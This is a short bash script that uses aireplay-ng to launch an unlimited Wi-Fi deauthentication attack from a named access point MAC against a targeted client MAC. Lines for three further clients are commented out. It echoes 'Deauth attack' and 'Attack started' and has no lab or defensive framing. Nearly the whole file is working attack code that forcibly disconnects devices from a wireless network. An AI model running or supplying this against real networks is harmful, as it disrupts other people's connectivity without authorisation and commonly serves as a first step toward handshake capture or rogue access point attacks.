#!/bin/bash

# chmod+x ./multideauth.sh

INTERFACE="wlan1mon"
AP="06:0F:A5:2F:13:37"

# Target client MACs
CLIENT1="7A:37:8E:08:DF:07"
# CLIENT2="77:88:99:AA:BB:CC"
# CLIENT3="DD:EE:FF:11:22:33"
# CLIENT4="YY:YY:YY:YY:YY:YY"

echo "Deauth attack on $AP..."

# Deauth commands simultaneously
aireplay-ng -0 0 -a $AP -c $CLIENT1 $INTERFACE &
# aireplay-ng -0 0 -a $AP -c $CLIENT2 $INTERFACE &
# aireplay-ng -0 0 -a $AP -c $CLIENT3 $INTERFACE &
# aireplay-ng -0 0 -a $AP -c $CLIENT4 $INTERFACE &

echo "Attack started..."
wait
